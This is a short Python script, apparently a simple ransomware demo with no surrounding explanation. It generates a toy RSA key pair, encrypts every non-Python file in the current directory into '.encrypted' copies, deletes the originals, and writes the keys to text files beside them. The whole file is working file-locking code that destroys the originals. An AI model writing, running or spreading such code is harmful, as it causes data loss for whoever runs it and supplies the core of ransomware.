import os
import encrypto

prime1 = encrypto.generateLargePrime(32)
prime2 = encrypto.generateLargePrime(32)

e = encrypto.generate_encryption_key(prime1, prime2)
d = encrypto.generate_decryption_key(e, prime1, prime2)
p = prime1 * prime2

for file in os.listdir():
    if not (file.endswith('.py') or file.endswith('.encrypted')
            or file == 'rsa_final_decryption_key.txt'
            or file == 'rsa_final_encryption_key.txt'
            or file == 'rsa_public_encryption_key.txt'):
        try:
            print('Opening file ' + file)
            with open(file, "rb") as fr:
                file_bytes = bytearray(fr.read())
                fr.close()
            print('Encrypting file ' + file)
            with open(file + '.encrypted', 'w') as fw:
                fw.write(encrypto.encryptByte(file_bytes, e, p))
                fw.close()
            os.remove(file)
        except PermissionError:
            print('Cannot open ' + file)
        except:
            print('Unknown Error')

with open('rsa_final_encryption_key.txt', 'w') as fw:
    fw.write(str(e))
    fw.close()
with open('rsa_final_decryption_key.txt', 'w') as fw:
    fw.write(str(d))
    fw.close()
with open('rsa_public_encryption_key.txt', 'w') as fw:
    fw.write(str(p))
    fw.close()

print('END')
